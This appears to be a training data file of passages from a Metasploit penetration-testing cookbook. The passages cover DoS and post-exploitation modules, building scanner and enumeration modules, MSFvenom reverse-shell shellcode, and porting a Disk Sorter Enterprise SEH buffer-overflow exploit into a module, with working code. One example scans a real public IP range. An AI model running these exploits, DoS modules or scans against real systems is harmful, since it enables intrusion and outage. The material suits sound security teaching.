305 ]\nWorking with Modules for Penetration Testing Chapter 9\nmsf > use auxiliary/dos/smb/smb_loris\nmsf auxiliary(dos/smb/smb_loris) > set RHOST 192.168.216.11\nRHOST => 192.168.216.11\nmsf auxiliary(dos/smb/smb_loris) > run\n[*] 192.168.216.11:445 - Sending packet from Source Port: 1025\n[*] 192.168.216.11:445 - Sending packet from Source Port: 1026\n[*] 192.168.216.11:445 - Sending packet from Source Port: 1027\n[*] 192.168.216.11:445 - Sending packet from Source Port: 1028\n[*] 192.168.216.11:445 - Sending packet from Source Port: 1029\n...\n2. In the target machine, you should see the memory consumption rise quickly until\nthe machine halts:\n[ 306 ]"
  },
  {
    "input": "How to do it...",
    "output": "Working with Modules for Penetration Testing Chapter 9\nDoS modules allow us not only to verify whether systems are vulnerable, but also to test\nwhether patches and mitigation against these types of attacks are working. You would be\nsurprised at the number of systems still vulnerable to these attacks and how often updates\nbreak previous patches, leaving systems vulnerable to old attacks.\nPost-exploitation modules\nPost-exploitation modules can be run on compromised targets to enumerate targets,\nescalate privileges, gather credentials, pivot into target networks, and much more. Post\nmodules replaced Meterpreter scripts that are obsolete and no longer supported.\nGetting ready\nWith more than 300 post modules, Metasploit has become one of the most complete post\ntools in the world, and thanks to the community, it is growing at a fast pace.\nHow to do it...\nLet's have a look at some post-exploitation modules and how to use them. In this recipe, we\nwill use the Windows Powershell Execution Post Module to execute PowerShell scripts in a\nMeterpreter session.\n[ 307 ]\nWorking with Modules for Penetration Testing Chapter 9\nFirst, we need to get a session on the Metasploitable 3 target machine; for that we can use\nthe Microsoft Windows Authenticated User Code Execution exploit module, then load\nthe Windows Powershell Execution Post Module, set the Meterpreter session, and specify\nthe PowerShell commands we want to execute in this example $Host:\nSuccessful execution of the module shows us the result of the $Host command. post\nmodules give us access to powerful post-exploitation functionalities and allow us to\nautomate the most repetitive tasks. So, if you are looking to contribute to the Metasploit\ncommunity, then you can work on post modules.\n[ 308 ]"
  },
  {
    "input": "How to do it...",
    "output": "Working with Modules for Penetration Testing Chapter 9\nUnderstanding the basics of module\nbuilding\nSo far, we have seen how useful modules are and the power that they can add to the\nframework. In order to master the framework, it is essential to understand building and\nworking with modules. This will help us quickly extend the framework according to our\nneeds. In the next few recipes, we will see how we can use Ruby scripting to build our own\nmodules and import them into the framework.\nHow to do it...\nLet's start with some of the basics of module building:\n1. In the first line, the require method specifies which libraries this module needs\nto load:\nrequire 'msf/core/post/windows/powershell'\n2. The following line defines the class which inherits the properties of the post\nfamily. The post module can import several functionalities, such as accessing the\nfilesystem, using the registry, WMI, LDAP, and so on:\nclass MetasploitModule < Msf::Post\n3. The include statement can be used to include a particular functionality of the\nframework into our own module. For example, if we are building a post module,\nwe can include it as:\ninclude Msf::Post::\n4. The following line will include PowerShell functionalities in the module:\ninclude Msf::Post::Windows::Powershell\n5. The following lines contain the module information, such as module name,\ndescription, license, author, platform, and so on:\ndef initialize(info={})\nsuper(update_info(info,\n'Name' => \"Windows Powershell Execution Post Module\",\n'Description' => %q{\nThis module will execute a powershell script in a meterpreter\n[ 309 ]\nWorking with Modules for Penetration Testing Chapter 9\nsession.\nThe user may also enter text substitutions to be made in memory\nbefore execution.\nSetting VERBOSE to true will output both the script prior to\nexecution and the results.\n},\n'License' => MSF_LICENSE,\n'Platform' => ['windows'],\n'SessionTypes' => ['meterpreter'],\n'Author' => [\n'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter\nscript\n'RageLtMan' # post module and libs\n]\n))\n6. register_options allows us to set the default values on required arguments:\nregister_options(\n[\nOptString.new( 'SCRIPT', [true, 'Path to the local PS script or\ncommand string to execute']),\n])\nregister_advanced_options(\n[\nOptString.new('SUBSTITUTIONS', [false, 'Script subs in gsub\nformat - original,sub;original,sub']),\n])\n7. Finally, the run method is where the actual code resides:\ndef run\n# Make sure we meet the requirements before running the script,\nnote no need to return\n# unless error\nraise \"Powershell not available\" if ! have_powershell?\n# Preprocess the Powershell::Script object with substitions\nfrom Exploit::Powershell\nscript = make_subs(read_script(datastore['SCRIPT']),\nprocess_subs(datastore['SUBSTITUTIONS']))\n# Execute in session\nprint_status psh_exec(script)\n[ 310 ]"
  },
  {
    "input": "How to do it...",
    "output": "Working with Modules for Penetration Testing Chapter 9\nprint_good 'Finished!'\nend\nAnalyzing built-in scripts is the best way to learn more about script building. There is quite\na bit of documentation available for learning module building, but the best way to learn\nRuby is to analyze existing modules.\nAnalyzing an existing module\nNow that we have accumulated some background about module building in our previous\nrecipe, our next step will be to analyze existing modules.\nGetting ready\nWe will analyze a Windows Powershell Execution Post Module in order to delve more\ndeeply into module building.\nWe will proceed from where we left off in the previous recipe. We have already discussed\nthe basic template of the module in the previous recipe, so here we will start from the main\nbody of the script.\nWe can find the Windows Powershell Execution Post Module at the following location:\n/usr/share/metasploit-\nframework/modules/post/windows/manage/exec_powershell.rb\nHow to do it...\nLet's start with an analysis of the run method of the module to understand how it works:\ndef run\nraise \"Powershell not available\" if ! have_powershell?\nscript = make_subs(read_script(datastore['SCRIPT']),\nprocess_subs(datastore['SUBSTITUTIONS']))\nprint_status psh_exec(script)\nprint_good 'Finished!'\nend\n[ 311 ]"
  },
  {
    "input": "Getting ready",
    "output": "Working with Modules for Penetration Testing Chapter 9\n1. First, it verifies that the requirements are met, in this case whether PowerShell is\navailable; if not it raises an exception:\nraise \"Powershell not available\" if ! have_powershell?\n2. Next, it reads and preprocesses the PowerShell script supplied and saves the\nresult in a variable named script:\nscript = make_subs(read_script(datastore['SCRIPT']),\nprocess_subs(datastore['SUBSTITUTIONS']))\n3. Finally, it calls the psh_exec method with the preprocessed PowerShell script as\nthe argument and prints the output to the screen using print_status, followed\nby the word Finished! and using print_good, which appends the\ncharacteristic [+] green sign to the output:\nprint_status psh_exec(script)\nprint_good 'Finished!'\nThis was a quick introduction to how a post module works within the framework. You can\nchange existing scripts accordingly to meet your needs. This makes the platform extremely\nportable for development.\nBuilding your own post-exploitation module\nNow, we have covered enough background about building modules. In this recipe, we will\nsee an example of how we can build our own module and add it to the framework. Building\nmodules can be very handy, as they give us the power to extend the framework depending\non our needs.\nGetting ready\nLet's build a small post-exploitation module that will enumerate all the users in a domain\nusing PowerShell. We already know how to run PowerShell scripts using the Windows\nPowershell Execution Post Module; however, typing PowerShell commands or having to\nmaintain separate files with scripts for common tasks can be daunting and prone to errors.\n[ 312 ]"
  },
  {
    "input": "How to do it...",
    "output": "Working with Modules for Penetration Testing Chapter 9\nHow to do it...\nPost modules are categorized based on their behavior, as shown in the following list from\nthe official documentation:\nCategory Description\ngather Modules that involve data gathering/collecting/enumeration.\ngather/credentials Modules that steal credentials.\ngather/forensics Modules that involve forensics data gathering.\nModules that modify/operate/manipulate something on the\nmanage system. Session management-related tasks such as migration,\ninjection also go here.\nModules that will help you learn more about the system in terms\nrecon of reconnaissance, but not about data stealing. Understand that\nthis is not the same as gather type modules.\nwlan Modules that are for WLAN related tasks.\nThis is deprecated, but the modules remain there due to\npopularity. This used to be the place for privilege escalation\nescalate\nmodules. All privilege escalation modules are no longer\nconsidered as post modules, they're now exploits.\nModules that involve monitoring something for data collection.\ncapture\nFor example, keylogging.\nSince our module will enumerate domain users, we should place it in the gather category,\nso our destination directory should be:\n/usr/share/metasploit-framework/modules/post/windows/gather/\nLet's build our post-exploitation module.\n1. First, we need to specify which libraries to load:\nrequire 'msf/core/post/windows/powershell'\n2. Next, define the class and include PowerShell functionalities in the module:\nclass MetasploitModule < Msf::Post\ninclude Msf::Post::Windows::Powershell\n[ 313 ]\nWorking with Modules for Penetration Testing Chapter 9\n3. Then we need to fill in the module information:\ndef initialize(info={})\nsuper(update_info(info,\n'Name' => 'PowerShell Domain User Enumeration',\n'Description' => %q{\nThis module will enumerate user accounts in the default\ndomain using PowerShell.\n},\n'License' => MSF_LICENSE,\n'Author' => [ 'Daniel Teixeira' ],\n'Platform' => [ 'win'],\n'SessionTypes' => [ 'meterpreter' ]\n))\nend\n4. For this module, we will use the PowerShell [adsiSearcher] type accelerator to\nsearch AD and list all the users:\nuser_enum = '([adsisearcher]\"objectcategory=user\").findall() |\nforeach {$_.Path} | ForEach-Object { $_.Split(\"=,\")[1]}'\n5. To finish, we just need to use print_status to print the output of the command\nto the screen:\nprint_status psh_exec(user_enum)\n6. Finally, we can save the module with the desired name and with a .rb extension.\nHere is the full module, which I have called ps_ad_users:\n##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'msf/core/post/windows/powershell'\nclass MetasploitModule < Msf::Post\ninclude Msf::Post::Windows::Powershell\ndef initialize(info={})\nsuper(update_info(info,\n'Name' => 'PowerShell Domain User Enumeration',\n'Description' => %q{\nThis module will enumerate user accounts in the default\ndomain using PowerShell.\n[ 314 ]\nWorking with Modules for Penetration Testing Chapter 9\n},\n'License' => MSF_LICENSE,\n'Author' => [ 'Daniel Teixeira' ],\n'Platform' => [ 'win'],\n'SessionTypes' => [ 'meterpreter' ]\n))\nend\ndef run\nuser_enum = '([adsisearcher]\"objectcategory=user\").findall() |\nforeach {$_.Path} | ForEach-Object { $_.Split(\"=,\")[1]}'\nprint_status psh_exec(user_enum)\nprint_good 'Finished!'\nend\nend\n7. To test it, I have added the Active Directory Domain Services Role to the\nMetasploitable 3 machine. To test the module, get an initial session on the target\nand load the module, specify the Meterpreter session ID, and run it:\n[ 315 ]"
  },
  {
    "input": "How to do it...",
    "output": "Working with Modules for Penetration Testing Chapter 9\nSince we do not need to be a privileged user to use this module, it can be very useful during\npost exploitation.\nBuilding your own auxiliary module\nThe Metasploit Framework has almost 1,000 auxiliary modules at the time of writing, and\nthe number is always rising, because there will always be new software and vulnerabilities\nthat are still not available in the framework. For that reason, in this recipe, we will learn\nhow to build our own auxiliary module.\nGetting ready\nIn this recipe, we will write an auxiliary module that will scan for Huawei home routers\nwith CPE WAN Management Protocol (CWMP) enabled. CWMP is a protocol used by\nproviders for remote management of customer-premises equipment. It allows auto-\nconfiguration, software or firmware image management, software module management,\nstatus and performance management, and diagnostics.\nHow to do it...\n1. When we connect to the router using the CWMP default port 7547, we get the\nfollowing answer:\n[ 316 ]\nWorking with Modules for Penetration Testing Chapter 9\n2. By using curl with the -v option for verbose, we can see the request made and\nthe reply from the router:\nroot@kali:~# curl -v http://89.181.67.197:7547\n* Rebuilt URL to: http://89.181.67.197:7547/\n* Trying 89.181.67.197...\n* TCP_NODELAY set\n* Connected to 89.181.67.197 (89.181.67.197) port 7547 (#0)\n> GET / HTTP/1.1\n> Host: 89.181.67.197:7547\n> User-Agent: curl/7.56.1\n> Accept: */*\n>\n< HTTP/1.1 401 Unauthorized\n< Connection: Keep-Alive\n< WWW-Authenticate: Basic realm=\"HuaweiHomeGateway\"\n< Content-Length: 0\n<\n* Connection #0 to host 89.181.67.197 left intact\nWith this information, we can build an auxiliary module to scan a target range\nand identify targets running Huawei home routers with CWMP enabled.\nSince Metasploit probably already has a module with the base features we are\nlooking for, the first thing we should do is search the available modules and see\nwhat we can use.\nFor this recipe, I will start with the HTTP Version Detection auxiliary module\nhttp_version.rb located in the /usr/share/metasploit-\nframework/modules/auxiliary/scanner/http folder, which has all the\nfeatures we will need for our module.\n3. Again, we will just focus on the run method. This is the original code:\ndef run_host(ip)\nbegin\nconnect\nres = send_request_raw({ 'uri' => '/', 'method' => 'GET' })\nfp = http_fingerprint(:response => res)\nprint_good(\"#{ip}:#{rport} #{fp}\") if fp\nreport_service(:host => rhost, :port => rport, :sname => (ssl\n? 'https' : 'http'), :info => fp)\nrescue ::Timeout::Error, ::Errno::EPIPE\nensure\n[ 317 ]\nWorking with Modules for Penetration Testing Chapter 9\ndisconnect\nend\nend\nAs we can see, it is quite simple: it connects to the target, sends an HTTP GET\nrequest, uses the http_fingerprint method to store the result in a variable\nnamed fp, then prints the output using print_good and uses report_service\nto add the result to the current workspace.\nFor our module, we will start by changing the initialize method.\n4. Using the register_options data structure, we can specify the default port\nnumber for the module, and since we want to scan for the CWMP service we will\nspecify port 7547:\nregister_options([\nOpt::RPORT(7547),\n])\n5. Then, we need to compare the response and verify that the equipment is a\nHuawei Home Gateway. For that, we will create a new variable called huawei\nholding the response from our router:\nhuawei = \" ( 401-Basic realm=\\\"HuaweiHomeGateway\\\" )\"\n6. Next, we will use an if statement to compare the response from the target with\nthe response from our router and, if they match, print and save the result:\nif fp == huawei\nprint_good(\"#{ip}\")\nreport_service(:host => rhost, :port => rport, :sname => (ssl ?\n'https' : 'http'), :info => \"CWMP - Huawei Home Gateway\")\nend\n7. Here is the final module:\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'rex/proto/http'\nclass MetasploitModule < Msf::Auxiliary\ninclude Msf::Exploit::Remote::HttpClient\n[ 318 ]\nWorking with Modules for Penetration Testing Chapter 9\ninclude Msf::Auxiliary::WmapScanServer\ninclude Msf::Auxiliary::Scanner\ndef initialize\nsuper(\n'Name' => 'Huawei Home Gateway CWMP Detection',\n'Description' => 'This module allows the identification of\nHuawei Home Gateway routers with CWMP enabled',\n'Author' => 'Daniel Teixeira',\n'License' => MSF_LICENSE\n)\nregister_wmap_options({\n'OrderID' => 0,\n'Require' => {},\n})\nregister_options(\n[\nOpt::RPORT(7547),\n])\nend\ndef run_host(ip)\nbegin\nconnect\nres = send_request_raw({ 'uri' => '/', 'method' => 'GET' })\nfp = http_fingerprint(:response => res)\nhuawei = \" ( 401-Basic realm=\\\"HuaweiHomeGateway\\\" )\"\nif fp == huawei\nprint_good(\"#{ip}\")\nreport_service(:host => rhost, :port => rport, :sname =>\n(ssl ? 'https' : 'http'), :info => \"CWMP - Huawei Home Gateway\")\nend\nrescue ::Timeout::Error, ::Errno::EPIPE\nensure\ndisconnect\nend\nend\nend\n[ 319 ]\nWorking with Modules for Penetration Testing Chapter 9\n8. Save the code into a file named huawei_cwmp.rb in /usr/share/metasploit-\nframework/modules/auxiliary/scanner/http, load the module using\nmsfconsole, set the IP address or range you want to scan, and run the module:\nmsf > use auxiliary/scanner/http/huawei_cwmp\nmsf auxiliary(scanner/http/huawei_cwmp) > set RHOSTS 89.181.67.0/24\nRHOSTS => 89.181.67.0/24\nmsf auxiliary(scanner/http/huawei_cwmp) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(scanner/http/huawei_cwmp) > run\n[+] 89.181.67.2\n[+] 89.181.67.165\n[+] 89.181.67.198\n...\n9. Since we are saving the output to the current workspace, we can use the host\nand services command to display the result of the scan:\n[ 320 ]"
  },
  {
    "input": "Introduction",
    "output": "10\nExploring Exploits\nIn this chapter, we will cover the following recipes:\nCommon exploit mixins\nExploring the module structure\nUsing MSFvenom to generate shellcode\nConverting an exploit to a Metasploit module\nPorting and testing a new exploit module\nFuzzing with Metasploit\nWriting a simple fuzzer\nIntroduction\nSo far, we have used exploits to compromise targets without knowing how they work.\nAlthough all the exploit modules are thoroughly verified, it is always good to understand\nhow they are built. As a penetration tester, knowing how to write your own module, or\nsimply adding a new target to an existing module, is a great skill to have.\nThis chapter will cover every detail that you need to know while working with exploits\nwithin the framework. We will not cover exploit development, an entire area of study in\nitself; we will use the available proof of concept (PoC) of exploits and see how they can be\nadded to the framework. We will also learn about some important mixins that can ease the\nprocess of converting exploits into the Metasploit module."
  },
  {
    "input": "How to do it...",
    "output": "Exploring Exploits Chapter 10\nCommon exploit mixins\nMixins are comprehensive mechanisms in the Ruby language that provide functionality for\na module. Mixins provide a way to include multiple inheritances in a single inheritance\nlanguage, for example, Ruby. Using mixins in exploit modules can help in calling different\nfunctions that the exploits require. So, we will learn about some important Metasploit\nexploit mixins.\nHow to do it...\nLet's take a quick look at some of the common exploit mixins. Then, we will look at their\nimplementation in an existing exploit module:\nExploit::Remote::TCP: This mixin provides TCP functionality to the exploit\nmodule. It can be used to set up a TCP connection. The connect() and\ndisconnect() functions are responsible for setting up and terminating\nconnections, respectively. This mixin requires different parameters, such as\nRHOST, RPORT, and SSL.\nExploit::Remote::UDP: This mixin is used for UDP functionality in the exploit\nmodule. UDP is generally treated as a faster mode of connectivity over TCP, so it\nis also a handy option when dealing with modules. This mixin also\nincludes Rex::Socket::UDP, which removes the overhead of worrying about\nsetting socket connections with the target.\nExploit::Remote::SMB: This mixin provides methods for interacting with an\nSMB/CIFS service on a remote machine. It extends the TCP exploit mixin and can\nbe very useful for exploitation. smb_login() and smb_ create() are some\nuseful functions present in this mixin.\nExploit::BruteTargets: This is an interesting mixin used to brute force the\ntarget. It uses the exploit_target(target) function to receive the remote\ntarget IP and perform a brute force attack. This mixin can be easily extended in\ndifferent brute force exploits.\nExploit::Remote::Ftp: This mixin can be used to exploit an FTP service on\nthe remote target. It includes Remote::TCP in order to set up a connection with\nthe remote target. It uses the connect() function, which receives values of\nRHOST and RPORT in order to connect to the FTP server on the remote system.\n[ 322 ]"
  },
  {
    "input": "Exploiting the module structure",
    "output": "Exploring Exploits Chapter 10\nMsf::Exploit::Seh: This mixin provides an interface to generate SEH\nregistration records in a dynamic and flexible fashion\nRex::Exploitation::Seh class.\nMsf::Exploit::Egghunter: This mixin provides an interface for generating\negghunters for various platforms, using the Rex::Exploitation::Egghunter\nclass. Egghunters are useful in situations where there is limited room for a\npayload when an overflow occurs, but it's possible to stick a larger payload\nsomewhere else in memory that may not be directly predictable.\nThese are some of the important exploit mixins that can be very handy when you are\nworking with exploit modules within the framework. Use of mixins reduces the overhead\nof recoding the same modules repeatedly. This is the reason why modular architecture is\nvery flexible, as it facilitates code reuse.\nAs stated earlier, mixins are used to provide multiple inheritances in a single inheritance\nlanguage, for example, Ruby. This means that we can call different functionalities in any\nmodule, depending on our needs. For example, if we want to establish a TCP connection in\nour exploit module, it is not required to define a complete function for that purpose. We can\nsimply call the Exploit::Remote::TCP mixin in our module and leverage its\nfunctionality.\nApart from the previously mentioned mixins, there are many more crucial mixins present in\nthe framework. These include FileFormat, IMAP, Java, and SMTP. You can find these\nmixins at lib/msf/core/exploit.\nExploiting the module structure\nIt is essential to understand the exploit module structure, as it will help us analyze different\nexploit modules. Since the Metasploit Framework is an open source project, its\ndevelopment depends on contributions from the community. Developers from around the\nglobe convert proof of concepts of various exploits into the Metasploit module so that they\ncan be used by everyone. Hence, you can also contribute to the community by converting\nnewly discovered exploits into modules. Also, there may be a situation where you need a\nparticular exploit that is not in the framework. Knowledge about the exploit module\nstructure will help you easily convert the exploit into a module. In this recipe, we will get to\nknow the basic structure of a module.\n[ 323 ]"
  },
  {
    "input": "How to do it...",
    "output": "Exploring Exploits Chapter 10\nGetting ready\nYou can find the exploit modules in the /usr/share/metasploit-\nframework/modules/exploits directory. Let's start the recipe analyzing the structure of\nexploits in the Metasploit Framework.\nHow to do it...\nAs we discussed earlier, the format of an exploit module is similar to that of an auxiliary\none, with some specific additions.\n1. The module starts with the declaration of a class, which extends the properties\nrelevant to the exploit. In this example, the MetasploitModule class extends the\nRemote Exploit libraries. In addition, the module includes other mixins, such\nas Seh, Egghunter, and Tcp:\nclass MetasploitModule < Msf::Exploit::Remote\nRank = GreatRanking\ninclude Msf::Exploit::Remote::Seh\ninclude Msf::Exploit::Remote::Egghunter\ninclude Msf::Exploit::Remote::Tcp\n2. Then, we have the initialize function, which is used to initialize the different\nvalues and content definitions of the modules. Some of the primary definitions of\nthis function include Name, Description, Author, and Version:\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => '',\n'Description' => %q(),\n'License' => MSF_LICENSE,\n'Author' => [''],\n...snip...\n3. The register_options method can register multiple basic datastore options.\nBasic datastore options are the ones that must be configured, such as the RPORT\noption in a server-side exploit:\nregister_options(\n[\nOpt::RPORT(21),\n], self.class)\n[ 324 ]"
  },
  {
    "input": "How it works...",
    "output": "Exploring Exploits Chapter 10\n4. So far, it has been very similar to auxiliary modules. The difference lies in the\nexploit() function: first, the connect method will call\nRex::Socket::Tcp.create to create the socket and register it to the\nframework. Then the buffer for transmission is built, it is sent using the put\nmethod with sock.put(), and finally the handler method is used to check\nwhether the payload connection has been established:\ndef exploit\nconnect\nbuf = rand_text_alpha(1024)\nbuf << [ target.ret ].pack('V')\nbuf << payload.encoded\nsock.put(buf)\nsock.get_once\nhandler\nend\nOptionally, you can also declare a vulnerability test function, check(), which verifies\nwhether the target is vulnerable or not. It verifies for all options except the payload.\nThis was a basic introduction to the exploit modules of Metasploit. In the later recipes, we\nwill discuss some core concepts related to the exploits in the framework.\nHow it works...\nThe exploit module structure that we just analyzed is Metasploit's way of making things\nunderstandable. Consider the def initialize() function. This part helps the module to\npick up common exploit definitions. Similarly, register_options() is used by\nMetasploit to pick up different parameters or assign default parameter values to the exploit\nmodule. This is where modular architecture comes in handy. Later in this chapter, we will\nsee how to convert an existing exploit code into a Metasploit module.\n[ 325 ]"
  },
  {
    "input": "Getting ready",
    "output": "Exploring Exploits Chapter 10\nUsing MSFvenom to generate shellcode\nWe already read about MSFvenom and now we will use it again, but this time to generate\ncustom shellcode that we can safely use in a PoC exploit. PoC exploits found online often\nuse a bind shell, have hardcoded IP addresses, or simply open a calculator to prove code\nexecution, which means that they may not fit your needs during a penetration test. For this\nreason, most of the time we need to replace the shellcode with our own code.\nShellcode is a small piece of code used as the payload in the exploitation of a software\nvulnerability. It is called shellcode because most of the time it is used to launch a shell so\nthat the attacker can control the compromised target.\nGetting ready\nWe will start by downloading a PoC I created a while back, which exploits a stack-based\nbuffer overflow vulnerability in the web interface of Disk Sorter Enterprise v9.5.12, caused\nby improper bounds checking of the request path in HTTP GET requests sent to the built-in\nweb server. The PoC and the vulnerable application are available in the Exploit Database\nwebsite at https:/​/​www.​exploit-​db.​com/​exploits/​41666/​. To set up the vulnerable\napplication, install it on the Windows 7 target machine then navigate to Tools | Disk Sorter\nEnterprise Options | Server and enable the web server on port 80 to start the web interface:\n[ 326 ]"
  },
  {
    "input": "How to do it...",
    "output": "Exploring Exploits Chapter 10\nHow to do it...\nLooking at the PoC, we can see that it is using a hardcoded IP address for the target\nmachine and a bind shell for the payload:\n[ 327 ]\nExploring Exploits Chapter 10\nThis means that if we want to use this exploit, we need to change the IP address to the one\nof our target and replace the shellcode with a reverse shell, since our target machine may\nhave the firewall enabled.\n1. When generating shellcode, one of the things you should pay attention to is\ncharacters that shouldn't be used, also known as bad characters. A character is\nconsidered bad because it will prevent the exploit from working, for example, in\na buffer overflow vulnerability, the null byte 0x00 will truncate the buffer,\npreventing the overflow to occur or breaking the shellcode. Fortunately, I have\nincluded the characters to avoid in the comments, but that is not always the case\nwhen using PoC exploits.\n2. Now that we have all the information we need, we can use MSFvenom to\ngenerate the shellcode, in this example using a Meterperter reverse shell, -\nb followed by the bad characters \"\\x00\\x09\\x0a\\x0d\\x20\", -f to specify the\noutput format, in this case python because the PoC is writing in Python, and --\nvar-name to specify the variable name so it matches the one used in the PoC,\nwhich is shellcode:\n[ 328 ]"
  },
  {
    "input": "Getting ready",
    "output": "Exploring Exploits Chapter 10\n3. Now, replace the shellcode in the PoC with the one we created using MSFvenom,\nchange the target's IP address, and start a handler using the Generic Payload\nHandler module.\n4. Also, since we are not using a bind shell, you may comment the last three lines of\nthe PoC:\n#print \"Waiting for shell...\"\n#time.sleep(10)\n#os.system(\"nc \" + host + \" 4444\")\n5. To run the exploit, use Python followed by the PoC script, as follows:\nroot@kali:~# python 41666.py\nroot@kali:~#\nBack in Metasploit, you should now have a new session:\nConverting an exploit to a Metasploit module\nNow we know how to successfully change a PoC, we can move to the next step and convert\nthe exploit to a Metasploit module. Having a basic knowledge of how to write exploits is\nessential, since most of the PoCs found online do not come with a manual. That being said,\nlet's move ahead with the recipe and see how we can build our own exploit modules, using\nan available PoC.\nGetting ready\nBefore we begin with the exploit conversion, it is important to learn how stack-based buffer\noverflows work.\n[ 329 ]\nExploring Exploits Chapter 10\nA stack-based buffer overflow occurs when more data is written to a buffer than it can hold,\noverrunning the buffer's boundary and overwriting adjacent memory locations.\nLooking at the PoC, we can see by sending 2487 characters we can overflow the next SEH\nand the SEH record:\nA Structured Exception Handler (SEH) is an exception handling mechanism. When a\nprogram crashes and an exception is triggered, SEH is called to try to recover\noperations. SEH is a linked list containing a sequence of data records; when an exception is\ntriggered, Windows will go through the list and try to handle the exception. If it can't, it will\ncontinue down the list and evaluate whether other exception functions are suitable.\nWhen exploiting an SEH overwrite, we can overwrite the handler attribute\nof EXCEPTION_REGISTRATION_RECORD with the address of a POP POP RET instruction\nsequence. When the exception is triggered, the program flow goes to the SEH where we\nplace code to jump to our payload.\nBy overwriting the next SEH, we can trick the SEH to execute a POP POP RET instruction,\nso the address to the next SEH will be placed in EIP, therefore executing the code in the next\nSEH, which will jump over some bytes and execute the shellcode.\nNext, we have an egghunter:\nAn egghunter is a technique used during exploit development to search the entire memory\nrange for the shellcode and redirect flow to it.\nSince Metasploit already has mixins that generate SEH records and egghunters, we do not\nneed to worry about writing our own or porting them from the PoC.\n[ 330 ]"
  },
  {
    "input": "How to do it...",
    "output": "Exploring Exploits Chapter 10\nHow to do it...\nTo port the PoC exploit to the Metasploit Framework, we can use the example.rb template\nin the /usr/share/metasploit-framework/modules/exploits folder.\n1. Now that we have enough information about how the PoC exploit works, we can\nstart by including the mixins we will need:\ninclude Msf::Exploit::Remote::Seh\ninclude Msf::Exploit::Remote::Egghunter\ninclude Msf::Exploit::Remote::HttpClient\n2. Then, we will specify the bad characters that should not be used in the payload:\n'Payload' =>\n{\n'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\",\n},\n3. Next, we can move to the target information where we will specify the number of\nbytes needed to overflow the next SEH record in the Offset variable and the\naddress of the POP POP RET instruction:\n'Targets' =>\n[\n[ 'Disk Sorter Enterprise v9.5.12',\n{\n'Offset' => 2488,\n'Ret' => 0x10015FFE # POP # POP # RET [libspp.dll]\n}\n]\n],\nAs you can see, we needed to adjust the offset from 2487 to 2488 so the exploit\nwould work. This is one of the reasons why you should learn how to use a\ndebugger and how to write basic exploits.\n4. In the exploit function, we will start by setting the egghunter options and\ngenerating the egg and the hunter:\neggoptions = {\nchecksum: true,\neggtag: rand_text_alpha(4, payload_badchars)\n}\n[ 331 ]"
  },
  {
    "input": "Porting and testing the new exploit module",
    "output": "Exploring Exploits Chapter 10\nhunter, egg = generate_egghunter(\npayload.encoded,\npayload_badchars,\neggoptions\n)\n5. Then, we can create the exploit following the same structure as the PoC:\n6. First, we will generate some random characters to fill the buffer, then place the\nSEH record followed by the hunter that will search for the egg, 10 NOPs, the egg\nthat contains our payload, and some random characters for padding:\nsploit = rand_text_alpha(target['Offset'])\nsploit << generate_seh_record(target.ret)\nsploit << hunter\nsploit << make_nops(10)\nsploit << egg\nsploit << rand_text_alpha(5500)\n7. Finally, we print status information telling us that the request is being sent and\nwe use the HttpClient mixin to send the exploit:\nprint_status('Sending request...')\nsend_request_cgi(\n'method' => 'GET',\n'uri' => sploit\n)\nAs you can see, the process is simple and straightforward.\nPorting and testing the new exploit module\nIn the previous recipe, we learned how to write an exploit module for Metasploit, using an\navailable PoC. In this recipe, we will save the module in an appropriate location and then\ntest it to see whether everything goes well.\n[ 332 ]"
  },
  {
    "input": "How to do it...",
    "output": "Exploring Exploits Chapter 10\nGetting ready\nIt is essential to store our exploit module in the proper place. This helps us to keep track of\ndifferent modules and understand the basic module usage. Now that you have the complete\nmodule, let's find out an appropriate location to save it.\nHow to do it...\nPrivate modules sets are located in the ~/.msf4/modules/ folder. So we will use the\nmkdir command to create a folder structure to hold our module. As this is an exploit\nmodule targeting the Windows operating system, which affects the HTTP protocol, we will\nhave to set the module's location accordingly:\nroot@kali:~# mkdir -p .msf4/modules/exploits/windows/http\nNow, save the ported module as disksorter.rb and check whether it is working, launch\nMetasploit, load the module, and try to exploit the target:\nLooking at the output, we can see that the module worked and we have a new session with\nsystem privileges.\n[ 333 ]"
  },
  {
    "input": "How to do it...",
    "output": "Exploring Exploits Chapter 10\nFuzzing with Metasploit\nFuzzing is a software testing technique that consists of finding implementation bugs using\nrandom data injection. Fuzzers generate malformed data and pass it to the particular target\nentity to verify its overflow capacity. Metasploit provides several fuzzing modules that can\nbe helpful in exploit development. Let's explore more about the basics of fuzzing and how\nMetasploit modules can be used as potential fuzzers.\nGetting ready\nBefore we jump to the Metasploit fuzzer modules, let's have a brief overview of fuzzing and\nits types.\nThe Metasploit Framework provides a complete set of libraries to manipulate network\nprotocols and data that can help us develop a simple fuzzer.\nDepending on the type of application or protocol that we are targeting, we can set up our\nfuzzer to generate data/packets to test for overflow conditions. Metasploit contains several\nfuzzer modules that can be used to test applications and protocols. These modules can be\nlocated in modules/auxiliary/fuzzers. Let's analyze the implementation of these\nmodules.\nHow to do it...\nLet's experiment with an HTTP fuzzer and find out how we would find the stack-based\nbuffer overflow in the Disk Sorter Enterprise application. Metasploit has an HTTP GET\nRequest URI Fuzzer that we can use:\n[ 334 ]\nExploring Exploits Chapter 10\nWell, that was easy. Looking at the output of the module, we can see that we were able to\ncrash the service by sending a request with 1583 characters to the Windows 7 target\nmachine. We can see the result:\n[ 335 ]"
  },
  {
    "input": "How to do it...",
